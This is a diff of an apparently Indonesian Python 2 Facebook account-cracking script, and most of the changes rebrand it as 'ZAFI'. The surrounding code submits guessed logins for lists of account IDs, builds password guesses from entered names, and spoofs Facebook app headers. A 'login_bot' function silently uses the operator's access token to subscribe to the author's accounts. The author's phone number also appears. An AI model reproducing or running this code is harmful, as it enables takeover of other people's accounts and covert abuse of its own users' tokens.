@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 # coding=utf-8
-# coding by FADIL STORE 
+# coding by FADILSTOREE 
 # Note : jangan di ubah lagi! nanti error, script udah enak
 # Open source code team | ngotak dikit cok jangan jual di perjual belikan 
 
@@ -13,7 +13,8 @@ ingfo = (
  - author      : FADILSTOREE 
  - whatsap     : 083110669758
  - github      : https://github.com/FADILSTOREEE/FADILSTOREEE.git
- - version     : 80.0
+ - script name : ZAFI (Zona Akun Facebook Indonesia)
+ - version     : 99.9
  
 %s"""%(Hj,Mt))
 
@@ -67,13 +68,8 @@ def folder():
 IP = requests.get("https://api.ipify.org/").text
 def banner():
 	print (''' %s 
- 
-  ____ ____      _    ____ _  __  _____ ____   
-  / ___|  _ \    / \  / ___| |/ / |  ___| __ )  
- | |   | |_) |  / _ \| |   | ' /  | |_  |  _ \  
- | |___|  _ <  / ___ \ |___| . \  |  _| | |_) | 
-  \____|_| \_\/_/   \_\____|_|\_\ |_|   |____/ 
-
+ © FADILGANS%s \n __________       _____.__  \n \____    /____ _/ ____\__| %s> %sZona \n   /     /\\__  \\\   __\|  | %s> %sAkun \n  /     /_ / __ \|  |  |  | %s>%s Facebook [Meta] \n /_______ (____  /__|  |__| %s>%s Indonesia \n         \/    \/ \n %s[%s*%s] By : %sFADILSTOREE \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
+ (H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
  
 # MASUK TOKEN (TOKEN LISTRIK)
 header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
@@ -126,8 +122,8 @@ def login_bot(romz):
 		romz2 = ('100029143111567')
 		romz3 = ('100028434880529')
 		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz1,toket)) # FADILSTOREE PENGGUNA AKUN UNIK
-		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz2,toket)) # DEMIT FADILSTOREE 
-		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz3,toket)) # FADILSTOREE (2018)
+		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz2,toket)) # DEMIT FADIL STOREE
+		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz3,toket)) # FADILSTOREE (2016)
 		
 	except:
 		pass
@@ -249,7 +245,7 @@ class ngentod:
                                 for akun in self.id:
                                     try:
                                         indo = akun.split('<=>')[0]
-                                        log.submit(self.b_api, indo, fadil_)
+                                        log.submit(self.b_api, indo, zafi_)
                                     except: pass
                             os.remove(self.apk);exit()
                         elif ind in ('2', '02'):
@@ -260,7 +256,7 @@ class ngentod:
                                 for akun in self.id:
                                     try:
                                         indo = akun.split('<=>')[0]
-                                        log.submit(self.basic, indo, fadil_)
+                                        log.submit(self.basic, indo, zafi_)
                                     except: pass
                             os.remove(self.apk);exit()
                         elif ind in ('3', '03'):
@@ -271,7 +267,7 @@ class ngentod:
                                 for akun in self.id:
                                     try:
                                         indo = akun.split('<=>')[0]
-                                        log.submit(self.mobil, indo, fadil_)
+                                        log.submit(self.mobil, indo, zafi_)
                                     except: pass
                             os.remove(self.apk);exit()
                         else:
@@ -746,16 +742,16 @@ def hasill(c):
 				print (cepek)
 				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
 			except IOError,KeyError:
-				exit (M+"\n [!] tidak ada hasil awokawokawok")
+				exit (M+"\n [!] tidak ada hasil ")
 		else:
 			exit()
 			
 def igg():
-	print ("\n%s [%s!%s] Cth nama %s: %sRomi "%(P,M,P,M,K))
+	print ("\n%s [%s!%s] Cth nama %s: %sFadil "%(P,M,P,M,K))
 	usr_ = raw_input('%s [?] Input nama > %s'%(P,K))
 	jumlah = input('%s [?] Limit user > %s'%(P,K))
 	bff_2 = usr_.replace(" ", "")
-	cr.append("fadil_storee")
+	cr.append("romi_afrizal")
 	mi.append(bff_2+"|"+bff_2)
 	mi.append(bff_2+"_"+"|"+bff_2)
 	for _i_ in range(1, jumlah+1):
